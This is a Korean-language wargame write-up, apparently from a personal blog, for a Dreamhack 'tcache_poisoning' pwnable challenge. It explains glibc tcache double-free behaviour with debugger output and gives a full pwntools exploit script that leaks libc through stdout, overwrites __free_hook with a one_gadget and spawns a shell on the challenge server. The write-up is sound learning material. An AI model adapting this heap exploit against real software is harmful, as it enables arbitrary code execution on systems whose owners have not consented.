---
title: "tcache_poisoning"
description: ""
date: 2024-08-01
draft: false
starred: false
tags: ["wargame", "dreamhack", "pwnable"]
comments: false
---

![스크린샷 2024-08-03 023111.png](/assets/content/blog/tcache_poisoning/screenshot_2024-08-03_023111.png)

## double free

햇갈리는 부분이 있었는데 tcache에 하는 double free 는 실제로 2개의 chunk 가 tcache에 들어가는게 아니라 counts에서 2로 찍히기만 하고 실제로는 chunk 하나가 fd가 자기 자신을 가리키는 것임.

아래는 double free 하고 나서의 tcache 

```python
pwndbg> tcache
tcache is pointing to: 0x16fb010 for thread 1
{
  counts = "\000\000\002", '\000' <repeats 60 times>, 
  entries = {0x0, 0x0, 0x16fb260, 0x0 <repeats 61 times>}
}
```

아래는 double free 한 것을 다시 alloc 하고 나서의 tcache. 보다시피 (아마도 counts 때문에) alloc이 되었음에도 아직 tcache에 남아있음을 확인할 수 있음.

```python
pwndbg> tcache
tcache is pointing to: 0x16fb010 for thread 1
{
  counts = "\000\000\001", '\000' <repeats 60 times>, 
  entries = {0x0, 0x0, 0x16fb260, 0x0 <repeats 61 times>}
}
```

그 다음 alloc한 곳에서 값을 저장하고 나서의 heap. 어차피 한 chunk가 free인 동시에 alloc된것이기 때문에 alloc에서 저장한 값이(`stdout` 주소) 그대로 free 한곳에도 저장되어 있음을 확인 가능. 

```python
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x16fb000
Size: 0x251

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x16fb250
Size: 0x41
fd: 0x601010

Top chunk | PREV_INUSE
Addr: 0x16fb290
Size: 0x20d71
```

## Memory paging

Virtual memory - Physical memory mapping technique.

보통 x64 cpu 에서는 4KB 단위가 default. (4KB == 0x1000) 해당 사이즈는 kernel 단에서 결정.

 따라서 이 문제에서 glibc의 base=0x0 일때의 주소와 `tcache_poison` 바이너리 실행시 메모리 위에 올라가는 glibc의 주소는 뒷 3자리가 같음.

```python
$ getconf PAGESIZE
4096
```

위와 같이 사이즈 확인도 가능.

![stdout 변수 load 된것과 stdout이 `_IO_2_1_stdout_` 가리키는모습](/assets/content/blog/tcache_poisoning/screenshot_2024-08-03_042040.png)

stdout 변수 load 된것과 stdout이 `_IO_2_1_stdout_` 가리키는모습

## Solution

1. double free로 `tcache_poison` 바이너리 상의 glibc `_IO_2_1_stdout_` 주소 알아내기.
2. one_gadget 툴로 glibc 에서 사용가능한 one gadget 주소 찾기.
3. 다시 double free로 `__free_hook` 주소를 one gadget 주소로 덮어씌우기.
4. `free()` 실행

```python
 #!/usr/bin/env python3
from pwn import *

# p = process("./tcache_poison")
p = remote("host3.dreamhack.games", 21643)
e = ELF("./tcache_poison")
libc = ELF("./libc-2.27.so")
# gdb.attach(p)

# alloc
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"48")
p.sendlineafter(b"Content: ", b"aaaaaaaa")

# free
p.sendlineafter(b"Edit\n", b"2")

# edit
p.sendlineafter(b"Edit\n", b"4")
p.sendlineafter(b"Edit chunk: ", b"bbbbbbbb\x00")

# free again
p.sendlineafter(b"Edit\n", b"2")

# re-alloc
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"48")
addr_stdout = e.symbols['stdout']
p.sendlineafter(b"Content: ", p64(addr_stdout))
# pause()

# re-alloc
# current fd: stdout addr 0x601010
# (stdout points at _IO_2_1_stdout_)
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"48")
p.sendlineafter(b"Content: ", b"cccccccc")
# pause()

# re-alloc
# current fd: _IO_2_1_stdout_
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"48")
_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]
p.sendafter(b"Content: ", _io_2_1_stdout_lsb)
# pause()

# print
p.sendlineafter(b"Edit\n", b"3")
p.recvuntil(b"Content: ")
stdout = u64(p.recv(6).ljust(8, b'\x00'))
base = stdout - libc.symbols['_IO_2_1_stdout_']

free_hook = base + libc.symbols['__free_hook']
og = base + 0x4f432         # one_gadget is located in glibc

# overwrite free hook with og
# since size:48(0x30) is taken by _IO_2_1_stdout_, can't overwrite
# so using size:0x40...
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"64")
p.sendafter(b"Content: ", b"aaaaaaaa")
# free 0x40
p.sendlineafter(b"Edit\n", b"2")

# edit 0x40
p.sendlineafter(b"Edit\n", b"4")
p.sendlineafter(b"Edit chunk: ", b"asdfasdf\x00")
# free 0x40 again
p.sendlineafter(b"Edit\n", b"2")

# re-alloc 0x40
# current fd: ???
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"64")
p.sendafter(b"Content: ", p64(free_hook))

# re-alloc 0x40
# current fd: free_hook
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"64")
p.sendafter(b"Content: ", b"asdfasdf")

# re-alloc 0x40
# current fd: where free_hook points at
p.sendlineafter(b"Edit\n", b"1")
p.sendlineafter(b"Size: ", b"64")
p.sendafter(b"Content: ", p64(og))

# free
p.sendlineafter(b"Edit\n", b"2")

p.interactive()
```

로컬 18.04에서는 `sh: 1: 2\xd492}\x7f: not found` 오류만 떴는데 문제에서 제공한 Dockerfile 의 ubuntu 버전(18.04.5)과 로컬 버전(18.04.6)이 달라서 그랬을 것으로 추측.
